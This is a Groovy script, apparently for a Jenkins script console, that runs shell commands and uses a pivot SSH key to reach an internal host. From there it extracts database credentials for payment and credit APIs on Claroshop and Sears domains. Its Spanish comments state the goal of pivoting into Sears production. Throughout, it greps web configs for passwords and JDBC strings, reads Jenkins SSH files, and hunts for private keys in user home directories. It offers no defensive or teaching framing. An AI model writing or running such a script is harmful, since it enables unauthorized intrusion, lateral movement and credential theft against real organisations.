// Extraer credenciales DB de apps web en T1Pagos jail + pivot SSH a PROD Sears
def exec = { cmd ->
    def proc = cmd.execute()
    def out = new StringBuilder()
    def err = new StringBuilder()
    proc.consumeProcessOutput(out, err)
    proc.waitForOrKill(20000)
    return out.toString() + (err.toString() ? "\nSTDERR:" + err.toString() : "")
}

def sshExec = { cmd ->
    def fullCmd = ["bash", "-c", "ssh -i /tmp/ssh_pivot/id_rsa -o StrictHostKeyChecking=no -o ConnectTimeout=10 -o BatchMode=yes jenkins@172.27.141.4 \"${cmd.replace('"', '\\"')}\" 2>&1"]
    return exec(fullCmd)
}

println "=== EXTRACCION CREDENCIALES DB DESDE JAIL ==="

// 1. Explorar directorio t1pagos API
println "\n--- t1pagos-api.dev.claroshop-services.io ---"
println sshExec("ls /var/www/sites/t1pagos-api.dev.claroshop-services.io/")

println "\n--- t1pagos-api contenido config ---"
println sshExec("find /var/www/sites/t1pagos-api.dev.claroshop-services.io/ -name '*.properties' -o -name '*.yml' -o -name '*.yaml' -o -name '*.conf' -o -name 'config*' -o -name '.env' 2>&1 | head -20")

println "\n--- t1pagos-api: spring application.properties ---"
println sshExec("cat /var/www/sites/t1pagos-api.dev.claroshop-services.io/config/application.properties 2>&1")
println sshExec("find /var/www/sites/t1pagos-api.dev.claroshop-services.io/ -name 'application*.properties' -exec cat {} \\; 2>&1 | head -60")
println sshExec("find /var/www/sites/t1pagos-api.dev.claroshop-services.io/ -name 'application*.yml' -exec cat {} \\; 2>&1 | head -60")

// 2. Grep directo por passwords en todos los sites (db, password, passwd, user)
println "\n--- GREP credenciales DB en t1pagos-api ---"
println sshExec("grep -r 'password\\|datasource\\|db_pass\\|mysql\\|jdbc\\|DB_PASS\\|DATABASE' /var/www/sites/t1pagos-api.dev.claroshop-services.io/ 2>/dev/null | grep -v '.class' | head -30")

// 3. Explorar Sears credit API
println "\n--- apicredito.dev.sears.com.mx ---"
println sshExec("ls /var/www/sites/apicredito.dev.sears.com.mx/")

println "\n--- apicredito: grep DB creds ---"
println sshExec("grep -r 'password\\|datasource\\|db_pass\\|mysql\\|jdbc\\|DB_PASS\\|DATABASE' /var/www/sites/apicredito.dev.sears.com.mx/ 2>/dev/null | grep -v '.class' | head -20")

// 4. Buscar por host dbasears en toda la estructura web
println "\n--- GREP dbasears.mrc-services.io en todos los sites ---"
println sshExec("grep -r 'dbasears\\|172.27.141.24\\|mrc-services' /var/www/sites/ 2>/dev/null | grep -v '.class' | grep -v '.jar' | head -30")

// 5. Buscar credenciales JDBC con host 172.27.141
println "\n--- GREP 172.27.141 en todos los sites ---"
println sshExec("grep -r '172.27.141' /var/www/sites/ 2>/dev/null | grep -v '.class' | grep -v '.jar' | head -20")

// 6. jenkins home
println "\n--- /home/jenkins ---"
println sshExec("ls -la /home/jenkins/")

println "\n--- jenkins .ssh ---"
println sshExec("ls -la /home/jenkins/.ssh/ 2>&1")

println "\n--- Jenkins known_hosts ---"
println sshExec("cat /home/jenkins/.ssh/known_hosts 2>&1")

// 7. Intentar SSH de T1Pagos jail a PROD Sears con las keys disponibles
println "\n--- Buscar SSH keys en home de usuarios ---"
println sshExec("find /home/ -name 'id_rsa' -o -name '*.pem' -o -name 'authorized_keys' 2>/dev/null | head -20")

println "\n--- Buscar SSH authorized_keys en jenkins ---"
println sshExec("cat /home/jenkins/.ssh/authorized_keys 2>&1")

// 8. Listar los jars del t1pagos para identificar version
println "\n--- JARs en t1pagos-api ---"
println sshExec("find /var/www/sites/t1pagos-api.dev.claroshop-services.io/ -name '*.jar' 2>&1 | head -5")

// 9. Jenkins scripts directory
println "\n--- jenkins-scripts ---"
println sshExec("ls /var/www/sites/jenkins-scripts/")

println "\n--- jenkins-scripts grep db ---"
println sshExec("grep -r 'password\\|172.27.141\\|dbasears\\|t1pagos\\|mysql' /var/www/sites/jenkins-scripts/ 2>/dev/null | head -20")

println "=== FIN EXTRACCION ==="
